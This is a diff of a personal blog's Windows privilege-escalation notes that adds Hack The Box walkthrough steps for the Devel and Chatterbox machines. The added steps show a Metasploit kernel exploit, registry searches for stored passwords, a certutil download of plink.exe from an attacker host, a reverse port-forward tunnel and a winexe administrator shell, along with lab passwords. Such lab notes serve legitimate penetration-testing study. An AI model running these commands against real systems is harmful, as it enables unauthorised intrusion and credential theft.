@@ -1,13 +1,13 @@
 ---
 layout: post
-title: "windows privilege escalation"
-keywords: "windows, privesc"
+title: "windows privesc"
+keywords: "windows, privesc, privilige escalation"
 ---
 
 #### Resources
 
 1. [https://github.com/TCM-Course-Resources/Windows-Privilege-Escalation-Resources](https://github.com/TCM-Course-Resources/Windows-Privilege-Escalation-Resources){:target="_blank"}
-1, [Windows PrivEsc Checklist](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation){:target="_blank"}
+1. [Windows PrivEsc Checklist](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation){:target="_blank"}
 
 #### System enumeration
 
@@ -95,3 +95,59 @@ meterpreter > run post/multi/recon/local_exploit_suggester
 - https://recipeforroot.com/advanced-powerup-ps1-usage/
 - https://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/
 - https://www.hackingarticles.in/window-privilege-escalation-automated-script/
+
+#### Kernel Exploits
+
+Hack The Box: Devel
+
+```
+meterpreter > background
+> use post/multi/recon/local_exploit_suggester
+> set session 1
+> run
+
+[+] 0.0.0.0 - use exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated
+
+> use exploit/windows/local/ms10_015_kitrap0d
+> set session 1
+> set lhost tun0
+> set lport 4445
+> run
+```
+
+#### Passwords & Port Forwarding
+
+https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
+
+Hack The Box: Chatterbox
+
+```
+> whoami
+> net users
+> net user <user>
+
+> reg query HKLM /f password /t REG_SZ /s
+> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+
+DefaultUserName    REG_SZ    <user>
+AutoAdminLogon     REG_SZ    1
+DefaultPassword    REG_SZ    *******
+```
+
+```
+> sudo vim /etc/ssh/sshd_config
+# Change PermitRootLogin prohibit-password to PermitRootLogin yes
+
+> service ssh restart
+> service ssh start
+```
+
+```
+> netstat -ano
+TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+
+# Download plink.exe (https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)
+>> certutil -urlcache -f http://10.10.14.51:8000/plink.exe plink.exe
+>> plink.exe -l root -pw toor -R 445:127.0.0.1:445 10.10.14.51 -v
+>>> winexe -U Administrator%Welcome1 //127.0.0.1 "cmd.exe"
+```
